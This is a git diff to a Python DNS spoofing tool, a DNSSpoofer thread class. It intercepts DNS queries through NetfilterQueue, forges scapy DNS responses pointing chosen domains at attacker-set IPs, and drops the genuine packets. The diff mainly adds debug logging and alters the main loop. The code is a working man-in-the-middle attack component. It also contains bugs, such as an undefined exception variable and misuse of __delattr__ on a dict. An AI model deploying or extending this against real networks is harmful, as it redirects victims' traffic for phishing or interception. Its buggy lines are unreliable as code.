@@ -47,12 +47,13 @@ class DNSSpoofer(threading.Thread):
         logger.debug('Targets set up! {}'.format(self.spoofaddr))
 
     def callback(self, packet):
-        logger.critical("HIT")
+        logger.critical("HIT!")
         if self.event.is_set():
             return
 
         payload = packet.get_payload()
         pkt = IP(payload)
+        logger.debug(pkt.show(dump=True))
         flag = False
 
         if not pkt.haslayer(DNSQR):
@@ -73,7 +74,7 @@ class DNSSpoofer(threading.Thread):
                       an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.spoofaddr[key]))
 
                     print("Spoofing DNS response to: ")
-                    spoofedPayload.show()
+                    logger.debug(spoofedPayload.show(dump=True))
                     packet.drop()
                     send(spoofedPayload, verbose=False)
                     flag = True
@@ -87,27 +88,34 @@ class DNSSpoofer(threading.Thread):
     def configurator(self):
         if not self.event.is_set():
             while not self.queue.empty():
+                logger.debug('FUNCTION HIT!')
                 cmd = self.queue.get()
                 self.__execute_cmd(cmd)
 
     def __execute_cmd(self, cmd):
         if len(cmd) == 0:
+            logger.debug('INVALID FUNCTION')
             pass
 
         if len(cmd) == 1:
             if cmd[0] == "ls":
+                logger.debug('LS FUNCTION')
                 self.queue.put(['lsa', self.spoofaddr])
+                logger.debug('LS FUNCTION ANSWER: {}'.format(self.spoofaddr))
 
         if len(cmd) == 2:
             if cmd[0] == 'r':
                 target = cmd[1]
                 if target in self.spoofaddr.keys():
+                    logger.debug('RM FUNCTION')
                     self.spoofaddr.__delattr__(target)
+                    logger.debug('RM FUNCTION COMPLETED: {}'.format(self.spoofaddr))
                 else:
-                    logger.warning('Cannot find target: {}, omitting'.format(target))
+                    logger.warning('RM FUNCTION ERROR: Cannot find target: {}, omitting'.format(target))
 
         if len(cmd) == 3:
             if cmd[0] == 'a':
+                logger.debug('ADD FUNCTION')
                 ip = None
                 try:
                     ip = ip_address(cmd[2])
@@ -115,15 +123,29 @@ class DNSSpoofer(threading.Thread):
                     ip = None
                     print("{} is not a valid IP address!")
                 self.spoofaddr[cmd[1]] = str(ip)
+                logger.debug('ADD FUNCTION COMPLETED: {}'.format(self.spoofaddr))
+
+    @staticmethod
+    def __run_threaded(q):
+        try:
+            q.run(False)  # Main loop
+        except:
+            msg = "Hard error occured! {}".format(e)
+            logger.critical(msg)
+            print(msg)
+
 
     def run(self):
         # This is the intercept
         q = NetfilterQueue()
         q.bind(1, self.callback)
+        #t = threading.Thread(target=self.__run_threaded, args=(q,))
+        # t.daemon = True
+        # t.start()
         while not self.event.is_set():
             self.configurator()
             try:
-                q.run(False)  # Main loop
+                q.run()  # Main loop
             except:
                 msg = "Hard error occured! {}".format(e)
                 logger.critical(msg)
